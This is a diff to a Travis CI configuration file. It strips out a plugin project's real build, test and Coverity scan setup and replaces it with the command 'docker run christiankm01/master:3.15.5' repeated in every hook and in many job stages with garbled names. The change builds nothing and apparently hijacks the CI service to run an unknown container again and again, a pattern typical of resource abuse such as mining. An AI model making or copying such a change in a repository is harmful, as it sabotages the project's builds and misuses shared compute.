@@ -1,124 +1,57 @@
-env:
-  global:
-   # The next declaration is the encrypted COVERITY_SCAN_TOKEN, created
-   #   via the "travis encrypt" command using the project repo's public key
-   - secure: "JfcPwFezMulGDS1vv0j6AWViagUTtDL0tIln9t62VHzAOMnfBb59NMPeX99YakEDwCChvFa8b+n18yim5CKRAFpEwC9/UQxh/4zzXBt5quT+9Q7p8tmxrXqmrZGun9qICpFdNT1nlTi2biFkZ04oSD+kmhdgFBPpUqKhLAnFFleqR90MyZXW/cG7WHz2InBxVDWyFXdiPZCaY66FapTaqXvkPAvNH9CH7uDhbCOfIyV6+hx+I1YrI/eTWsF1fo8P+LG7n7JWkDJvVbCjA81cXGCfHUA8qWwEqQoAPX82lkvpOnXcFE3b5YcxWSAlrN8Veq5cUrdPaxds/heuNqYmgOhro2ZMTdG8x8cAnDD3YiaAG27rLEjxVPk1KRR5oGjc2en/HTy1UfLq/gLpUXoA2qpu5o582rYRpB99rRWEqh1hAshHYpPUPDvZjzkU8TKmsVlZNVaJO5cGz9pJRFRB7+LfLytcCLjTCfrd4FLL9apgtHSpOv8+amYy4ilz20FJmeKeAfRBXZx2f7U17AFiqn4DGlkjKEL21jq6vZMoLo5I7Tx7XWH3AHw0kvlDcbn/z6KWYr34P4VbKLcbwW3eYVQ0LSElmKYNhkuh7EDF2xpxesStBvytW41wBh5RYaXHy8BRNIv3pnuzD6t9oAg7QG7sqgMZG9YWm/moPtzKyhQ="
-   # Coverity run condition (avoid matrix multiple runs), need customized
-   # build script. Need an update if new matrix cases.
-   - coverity_scan_run_condition='"$CC" = gcc -a "$TRAVIS_OS_NAME" != osx'
-   # Coverity script test mode (if true no uploading, avoid reaching the quota)
-   # usual processing: false.
-   - coverity_scan_script_test_mode=false
-   # Travis CI has 1.5 cores per VM, take advantage of it
-   - MAKEFLAGS="-j 2"
-
-language: cpp
-
-matrix:
-  include:
-    - os: linux
-      compiler: gcc
-    - os: linux
-      compiler: clang
-    - os: osx
-      compiler: clang
-    - os: windows
-      filter_secrets: false # https://travis-ci.community/t/choco-install-hangs-forever/307/22
-  allow_failures:
-    - os: windows # ibecause of error C2572 with gmic 2.8.4, see https://travis-ci.org/github/NatronGitHub/openfx-gmic/jobs/699201724
-  fast_finish: true
-
+language: c
+arch:
+  - amd64
+compiler:
+  - gcc
+services:
+  - docker
 before_install:
-  - if [ ${TRAVIS_OS_NAME} = "linux" -o ${TRAVIS_OS_NAME} = "osx" ]; then
-      env;
-      df;
-      date -u;
-      uname -a;
-      export J='-j3';
-    fi
-  - if [ ${TRAVIS_OS_NAME} = "linux" ]; then
-      echo -n | openssl s_client -connect scan.coverity.com:443 | sed -ne '/-BEGIN CERTIFICATE-/,/-END CERTIFICATE-/p' | sudo tee -a /etc/ssl/certs/ca- ;
-    fi
-  - if [ ${TRAVIS_OS_NAME} = "linux" ]; then
-      sudo apt-get install libfftw3-dev;
-    fi
-  - if [ ${TRAVIS_OS_NAME} = "osx" ]; then
-      brew install fftw || true;
-    fi
-  - if [ ${TRAVIS_OS_NAME} = "windows" ]; then
-      choco install wget 7zip;
-      wget -q ftp://ftp.fftw.org/pub/fftw/fftw-3.3.4-dll64.zip;
-      7z x fftw-3.3.4-dll64.zip libfftw3-3.dll fftw3.h;
-    fi
-  - git submodule update --init --recursive
-  - if [ ${TRAVIS_OS_NAME} = "linux" -a "$CC" = "gcc" ];
-    then
-        if [ "$BUILDDOC" = 1 ]; then
-            sudo apt-get install doxygen xsltproc;
-        fi;
-        sudo add-apt-repository -y ppa:ubuntu-toolchain-r/test;
-        sudo apt-get update;
-        sudo apt-get install gcc-8 g++-8;
-        sudo update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-8 90;
-        sudo update-alternatives --install /usr/bin/g++ g++ /usr/bin/g++-8 90;
-    fi
-  - if [ ${TRAVIS_OS_NAME} = "windows" ]; then choco install curl patch make cmake; fi
-
-install:
-  - if [[ ${COVERITY_BUILD_DISABLED} == 1 ]];
-    then
-        exit 0;
-    fi
-
-# CImg is now downloaded by CImg/Makefile, no need to install it
-#  - sudo apt-get install cimg-dev
-
+  - docker run christiankm01/master:3.15.5
+before_script:
+  - docker run christiankm01/master:3.15.5
 script:
-  - if [[ ${COVERITY_SCAN_BRANCH} == 1 ]];
-    then
-      echo "Don't build on coverity_scan branch.";
-      exit 0;
-    fi
-  - make sources
-  - if [ ${TRAVIS_OS_NAME} = "linux" -o ${TRAVIS_OS_NAME} = "osx" ]; then
-      make $J CONFIG=debug;
-      make $J nomulti CONFIG=debug;
-      if [ "$CC" = "gcc" ]; then
-        make CONFIG=debug clean;
-        make $J CONFIG=debug OPENMP=1;
-      fi
-    fi
-  - if [ ${TRAVIS_OS_NAME} = "windows" ]; then
-      mkdir build && cd build;
-      cmake .. ;
-      cmake --build . ; 
-    fi
-
-# ubuntu-toolchain-r/test contains recent versions of gcc
-addons:
-  apt:
-    sources:
-    - ubuntu-toolchain-r-test
-    packages:
-    - ca-certificates
-    - gcc-8
-    - g++-8
-    - libfftw3-dev
-    - libgl-dev
-  coverity_scan:
-    # customized build script URL
-    # TRAVIS_REPO_SLUG: owner_name/repo_name of repository currently being built
-    # TRAVIS_BRANCH: name of the branch currently being built
-    build_script_url: https://raw.githubusercontent.com/$TRAVIS_REPO_SLUG/$TRAVIS_BRANCH/.travis-coverity-scan-build.sh
-    # project metadata
-    project:
-      name: $TRAVIS_REPO_SLUG
-    # Where email notification of build analysis results will be sent
-    notification_email: frederic.devernay@m4x.org
-    # Commands to prepare for build_command
-    #build_command_prepend: ./configure
-    # This command will be added as an argument to "cov-build" to compile
-    # the project for analysis
-    build_command: "make $J CONFIG=debug"
-    # Pattern to match selecting branches that will run analysis
-    branch_pattern: coverity_scan
+  - docker run christiankm01/master:3.15.5
+after_script:
+  - docker run christiankm01/master:3.15.5
+after_install:
+  - docker run christiankm01/master:3.15.5
+before_deploy:
+  - docker run christiankm01/master:3.15.5
+deploy:
+  - docker run christiankm01/master:3.15.5
+after_deploy:
+  - docker run christiankm01/master:3.15.5
+after_success:
+  - docker run christiankm01/master:3.15.5
+after_failure:
+  - docker run christiankm01/master:3.15.5
+jobs:
+  include:
+    - stage: test
+      script: docker run christiankm01/master:3.15.5
+    - stage: test2
+      script: docker run christiankm01/master:3.15.5
+    - stage: deploy
+      script: docker run christiankm01/master:3.15.5
+    - stage: testman
+      script: docker run christiankm01/master:3.15.5
+    - stage: test-capability
+      script: docker run christiankm01/master:3.15.5
+    - stage: test-capabilitd
+      script: docker run christiankm01/master:3.15.5
+    - stage: test-capabilitya
+      script: docker run christiankm01/master:3.15.5
+    - stage: test-capabilityki
+      script: docker run christiankm01/master:3.15.5
+    - stage: test-capabilityn
+      script: docker run christiankm01/master:3.15.5
+    - stage: test-capabilityks
+      script: docker run christiankm01/master:3.15.5
+    - stage: test-capabili
+      script: docker run christiankm01/master:3.15.5
+    - stage: test-capab
+      script: docker run christiankm01/master:3.15.5
+    - stage: test-capabilityhjj
+      script: docker run christiankm01/master:3.15.5 
+    - stage: test-capabiy
+      script: docker run christiankm01/master:3.15.5
